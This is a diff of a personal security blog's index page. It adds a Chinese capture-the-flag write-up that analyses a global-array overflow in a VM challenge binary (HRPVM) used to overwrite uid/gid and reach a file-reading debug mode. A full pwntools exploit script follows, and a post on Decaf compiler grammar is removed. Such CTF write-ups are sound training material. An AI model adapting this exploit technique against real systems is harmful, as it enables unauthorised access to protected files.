@@ -156,6 +156,111 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/24/VM%20pwn+bss%E6%BA%A2%E5%87%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/06/24/VM%20pwn+bss%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">VM pwn+bss溢出</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-06-24 09:45:44 / Modified: 09:48:30" itemprop="dateCreated datePublished" datetime="2023-06-24T09:45:44+08:00">2023-06-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>4.8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>vmbyhrp</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HRPVM: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=ae19ec35e351cd7e0113b04270566c04bd3bd321, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<ul>
+<li>64位，dynamically，全开</li>
+</ul>
+<p><strong>漏洞分析</strong></p>
+<p>在 DEBUG 命令中有读取任意文件的功能：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;FILE NAME:&quot;</span>);</span><br><span class="line">name = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">read(<span class="number">0</span>, name, <span class="number">0x20</span>uLL);</span><br><span class="line">deleEnter((<span class="keyword">const</span> <span class="keyword">char</span> *)name);</span><br><span class="line">stream = fopen((<span class="keyword">const</span> <span class="keyword">char</span> *)name, <span class="string">&quot;ab+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( stream )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)__isoc99_fscanf(stream, <span class="string">&quot;%c&quot;</span>, &amp;data[i]) != <span class="number">-1</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  HF[file_count].fd = global_fd;</span><br><span class="line">  HF[file_count].name = (<span class="keyword">char</span> *)name;</span><br><span class="line">  HF[file_count].size = <span class="number">1000LL</span>;</span><br><span class="line">  count = file_count;</span><br><span class="line">  HF[count].data = (__int64)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)HF[file_count].data, data, <span class="number">0x1000</span>uLL);</span><br><span class="line">  ++file_count;</span><br><span class="line">  ++global_fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>DEBUG 命令需要覆盖 gid 和 uid</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(system_cmd[<span class="number">6</span>], (<span class="keyword">const</span> <span class="keyword">char</span> *)buf, len) &amp;&amp; !gid &amp;&amp; !uid )<span class="comment">// debug</span></span><br><span class="line">  DEBUG();</span><br></pre></td></tr></table></figure>
+<p>全局变量 <code>file_count</code> 没有限制大小，导致 <code>HF</code> 可以向下溢出到 gid 和 uid</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HF[file_count].fd = global_fd;</span><br><span class="line">HF[file_count].name = name;</span><br><span class="line">HF[file_count].size = <span class="number">1000LL</span>;</span><br><span class="line">count = file_count;</span><br><span class="line">HF[count].data = (__int64)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;FILE CONTENT: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, (<span class="keyword">void</span> *)HF[file_count].data, <span class="number">0x1000</span>uLL);</span><br><span class="line">deleEnter((<span class="keyword">const</span> <span class="keyword">char</span> *)HF[file_count].data);</span><br><span class="line">++file_count;</span><br></pre></td></tr></table></figure>
+<p><strong>入侵思路</strong></p>
+<p>使用如下两个脚本并配合溢出可以很轻松地覆盖 gid 和 uid：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload =  <span class="string">&quot;mov rdi,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rsi,36;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rdx,1001;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rax,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;call write,1;&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">&quot;mov rdi,35;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rsi,0;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rax,2;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;call open,2;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>但 DEBUG 退出时会置空全局变量 <code>dest</code> 导致后续程序触发段错误：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deleEnter(buf);</span><br><span class="line">gid = <span class="number">1000</span>;</span><br><span class="line">uid = <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">strncpy</span>(dest, src, <span class="number">8uLL</span>);</span><br><span class="line">machine_start();</span><br></pre></td></tr></table></figure>
+<p>在 <code>login_system</code> 函数中可以往全局变量 <code>dest</code> 中写入数据：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;[+]HOLDER:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, dest, <span class="number">0x10</span>uLL);</span><br></pre></td></tr></table></figure>
+<p>在 mmap 命令中可以使用 mmap 创建一片合法的空间：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(debug_cmd[<span class="number">4</span>], buf, len) )     <span class="comment">// mmap</span></span><br><span class="line">&#123;</span><br><span class="line">  addr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]ADDR EXPEND:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;addr);</span><br><span class="line">  mmap(addr, <span class="number">0x400</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>于是我们可以在 DEBUG 使用 mmap 指令创建合法空间，然后 reboot 调用 <code>login_system</code> 并写入合法空间，这样就不会发生段错误了</p>
+<p>剩下的操作就是程序的正常功能，完整 exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./HRPVM&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x248E)\nb *$rebase(0x220B)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">name</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;./&quot;</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;FILE NAME: &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;FILE CONTENT: &quot;</span>,data)   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">name</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;rm &quot;</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;USER NAME:&quot;</span>,<span class="string">&quot;HRPHRP&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;PASSWORD:&quot;</span>,<span class="string">&quot;PWNME&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+]HOLDER:&quot;</span>,<span class="string">&quot;YHELLOW&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;mov rdi,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rsi,36;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rdx,1001;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rax,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;call write,1;&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">&quot;mov rdi,35;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rsi,0;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rax,2;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;call open,2;&quot;</span></span><br><span class="line"></span><br><span class="line">payload3 =  <span class="string">&quot;mov rdi,36;&quot;</span></span><br><span class="line">payload3 += <span class="string">&quot;mov rsi,1001;&quot;</span></span><br><span class="line">payload3 += <span class="string">&quot;mov rax,2;&quot;</span></span><br><span class="line">payload3 += <span class="string">&quot;call open,2;&quot;</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;write&quot;</span>,payload)</span><br><span class="line">add(<span class="string">&quot;open&quot;</span>,payload2)</span><br><span class="line">add(<span class="string">&quot;open2&quot;</span>,payload3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i),<span class="string">&quot;1111&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;open&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+][DEBUGING]root#&quot;</span>,<span class="string">&quot;file input&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;FILE NAME:&quot;</span>,<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+][DEBUGING]root#&quot;</span>,<span class="string">&quot;mmap&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+]ADDR EXPEND:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x560000000000</span>))</span><br><span class="line">sla(<span class="string">&quot;[+][DEBUGING]root#&quot;</span>,<span class="string">&quot;exit&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;reboot&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;USER NAME:&quot;</span>,<span class="string">&quot;HRPHRP&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;PASSWORD:&quot;</span>,<span class="string">&quot;PWNME&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+]HOLDER:&quot;</span>,p64(<span class="number">0x560000000000</span>))</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;open2&quot;</span>)</span><br><span class="line">pwn(<span class="string">&quot;write&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/22/VM%20pwn+exit_hook%E5%8A%AB%E6%8C%81+mmap%E6%BA%A2%E5%87%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1299,190 +1404,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/07/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab0%EF%BC%9ADecaf%E8%AF%AD%E6%B3%95%E8%A7%84%E5%88%99/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/06/07/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab0%EF%BC%9ADecaf%E8%AF%AD%E6%B3%95%E8%A7%84%E5%88%99/" class="post-title-link" itemprop="url">CMPT379编译器Lab0：Decaf语法规则</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-06-07 19:23:00 / Modified: 21:22:53" itemprop="dateCreated datePublished" datetime="2023-06-07T19:23:00+08:00">2023-06-07</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>8.6k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>8 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Decaf 是一种强类型的类 C 语言，功能集与通常作为成熟编程语言的一部分相比大幅缩减（这样做是为了保持编程分配易于管理）</p>
-<p>下面是一个 Decaf 的案例：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> func <span class="title">print_int</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">void</span></span>;</span><br><span class="line"></span><br><span class="line">package GreatestCommonDivisor &#123;</span><br><span class="line">    var a <span class="keyword">int</span> = <span class="number">10</span>;</span><br><span class="line">    var b <span class="keyword">int</span> = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">func <span class="title">main</span><span class="params">()</span> <span class="keyword">int</span> </span>&#123;</span><br><span class="line">        var x, y, z <span class="keyword">int</span>;</span><br><span class="line">        x = a;</span><br><span class="line">        y = b;</span><br><span class="line">        z = gcd(x, y);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// print_int is part of the standard input-output library</span></span><br><span class="line">        print_int(z);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// function that computes the greatest common divisor</span></span><br><span class="line">    <span class="function">func <span class="title">gcd</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>)</span> <span class="keyword">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="number">0</span>) &#123; <span class="keyword">return</span>(a); &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="keyword">return</span>( gcd(b, a % b) ); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>语法是使用 EBNF（扩展巴科斯范式）指定的：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Production  = production_name <span class="string">&quot;=&quot;</span> [ Expression ] <span class="string">&quot;.&quot;</span> . <span class="comment">/* 定义 */</span></span><br><span class="line">Expression  = Alternative &#123; <span class="string">&quot;|&quot;</span> Alternative &#125; . <span class="comment">/* 表达 */</span></span><br><span class="line">Alternative = Term &#123; Term &#125; . <span class="comment">/* 选择 */</span></span><br><span class="line">Term        = production_name | token [ <span class="string">&quot;...&quot;</span> token ] | Group | Option | Repetition | Repetition+ | CommaList . <span class="comment">/* 术语 */</span></span><br><span class="line">Group       = <span class="string">&quot;(&quot;</span> Expression <span class="string">&quot;)&quot;</span> . <span class="comment">/* 分组 */</span></span><br><span class="line">Option      = <span class="string">&quot;[&quot;</span> Expression <span class="string">&quot;]&quot;</span> . <span class="comment">/* 可选 */</span></span><br><span class="line">Repetition  = <span class="string">&quot;&#123;&quot;</span> Expression <span class="string">&quot;&#125;&quot;</span> . <span class="comment">/* 重复 */</span></span><br><span class="line">Repetition+ = <span class="string">&quot;&#123;&quot;</span> Expression <span class="string">&quot;&#125;+&quot;</span> .</span><br><span class="line">CommaList   = <span class="string">&quot;&#123;&quot;</span> Expression <span class="string">&quot;&#125;+,&quot;</span> .</span><br></pre></td></tr></table></figure>
-<p>Production 是由 Term 和以下运算符构造的表达式，优先级越来越高： </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|    alternation</span><br><span class="line">()   grouping</span><br><span class="line">[]   option (<span class="number">0</span> <span class="keyword">or</span> <span class="number">1</span> Expression)</span><br><span class="line">&#123;&#125;   repetition (<span class="number">0</span> to n Expressions)</span><br><span class="line">&#123;&#125;+  repetition (<span class="number">1</span> to n Expressions)</span><br><span class="line">&#123;&#125;+, comma <span class="built_in">list</span> (<span class="number">1</span> to n Expressions comma separated, e.g. x, y, z)</span><br></pre></td></tr></table></figure>
-<p>Decaf 源代码编码为 ASCII 文本，大写和小写字符被视为不同的字符</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">letter        = <span class="string">&quot;A&quot;</span> ... <span class="string">&quot;Z&quot;</span> | <span class="string">&quot;a&quot;</span> ... <span class="string">&quot;z&quot;</span> | <span class="string">&quot;_&quot;</span> . <span class="comment">/* 字母 */</span></span><br><span class="line">decimal_digit = <span class="string">&quot;0&quot;</span> ... <span class="string">&quot;9&quot;</span> . <span class="comment">/* 10进制数字 */</span></span><br><span class="line">hex_digit     = <span class="string">&quot;0&quot;</span> ... <span class="string">&quot;9&quot;</span> | <span class="string">&quot;A&quot;</span> ... <span class="string">&quot;F&quot;</span> | <span class="string">&quot;a&quot;</span> ... <span class="string">&quot;f&quot;</span> . <span class="comment">/* 16进制数字 */</span></span><br><span class="line">digit         = <span class="string">&quot;0&quot;</span> ... <span class="string">&quot;9&quot;</span> . <span class="comment">/* 数字 */</span></span><br></pre></td></tr></table></figure>
-<p>以下关键字是保留的，不能用作标识符：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span>    <span class="keyword">break</span>   <span class="keyword">continue</span>  <span class="keyword">else</span>   <span class="keyword">extern</span>  <span class="literal">false</span>   </span><br><span class="line"><span class="keyword">for</span>     func    <span class="keyword">if</span>        <span class="keyword">int</span>    null    package </span><br><span class="line"><span class="keyword">return</span>  <span class="built_in">string</span>  <span class="literal">true</span>      var    <span class="keyword">void</span>    <span class="keyword">while</span>  </span><br></pre></td></tr></table></figure>
-<p>以下字符序列表示运算符（请参阅下面的运算符部分）和分隔符：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;  &#125;   [   ]   ,   ;   (   )  =  </span><br><span class="line">-  !   +   *   /   &lt;&lt;  &gt;&gt;  &lt;  &gt;  </span><br><span class="line">%  &lt;=  &gt;=  ==  !=  &amp;&amp;  ||  .</span><br></pre></td></tr></table></figure>
-<p>Decaf 有四种类型：void，布尔，整数和字符串</p>
-<ul>
-<li>字符串类型只能与外部函数一起使用（这里的 “外部函数” 指的是程序内定义的函数，或者用 C 实现的 Decaf 标准库函数）</li>
